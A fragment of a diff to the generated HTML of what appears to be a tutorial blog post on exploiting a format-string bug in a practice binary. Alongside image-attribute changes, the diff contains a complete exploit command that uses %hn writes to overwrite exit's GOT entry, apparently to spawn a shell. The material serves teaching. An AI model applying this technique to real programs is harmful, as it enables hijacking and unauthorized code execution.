-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#6272A4"># 55737</span></span></code></pre>
 </li>
 <li>
 <p>Get <code>exit</code> address in GOT</p>
-<p><img  src="/_astro/got-table.UW66qH2K_ZtGA09.webp" alt="" width="557" height="251" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="557" height="251" src="/_astro/got-table.UW66qH2K_HrgCN.webp" ></p>
 </li>
 <li>
 <p>Exploit</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./fmt.out</span><span style="color:#F8F8F2"> $(</span><span style="color:#8BE9FD">printf</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">\x7a\xb2\x04\x08\x78\xb2\x04\x08</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">%65527x%4</span><span style="color:#FF79C6">\$</span><span style="color:#F1FA8C">hn%55737x%5</span><span style="color:#FF79C6">\$</span><span style="color:#F1FA8C">hn</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/shell-execution.CQXEavTb_1aI2dN.webp" alt="" width="473" height="130" loading="lazy" decoding="async"></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./fmt.out</span><span style="color:#F8F8F2"> $(</span><span style="color:#8BE9FD">printf</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">\x7a\xb2\x04\x08\x78\xb2\x04\x08</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">%65527x%4</span><span style="color:#FF79C6">\$</span><span style="color:#F1FA8C">hn%55737x%5</span><span style="color:#FF79C6">\$</span><span style="color:#F1FA8C">hn</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="473" height="130" src="/_astro/shell-execution.CQXEavTb_Zfw1RO.webp" ></p>
 </li>
 </ol>
 <h1 id="conclusion">Conclusion</h1>
